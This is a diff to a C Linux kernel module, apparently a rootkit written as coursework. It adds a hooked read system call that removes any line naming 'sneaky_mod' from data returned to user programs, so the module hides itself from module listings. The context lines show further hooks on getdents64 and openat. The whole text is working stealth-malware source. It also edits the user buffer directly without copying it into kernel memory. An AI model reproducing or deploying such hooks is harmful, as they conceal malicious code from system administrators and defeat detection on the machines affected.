@@ -68,6 +68,26 @@ asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs)
   return nread;
 }
 
+asmlinkage ssize_t (*original_read)(struct pt_regs *regs);
+
+asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs) {
+  ssize_t nread = original_read(regs);
+  char* begin;
+  char* end;
+  if(nread>0){
+    begin = strnstr(regs -> si,"sneaky_mod ",nread);
+    if(begin != NULL){
+      end = strnstr(begin,"\n",nread-(begin-(char*)(regs -> si)));
+      if(end != NULL){
+        end++;
+        memmove(begin,end, (char __user *)(regs -> si) + nread - end);
+        nread -= (end-begin);
+      }
+    }
+  }
+  return nread;
+}
+
 asmlinkage int (*original_openat)(struct pt_regs *);
 
 // Define your new sneaky version of the 'openat' syscall
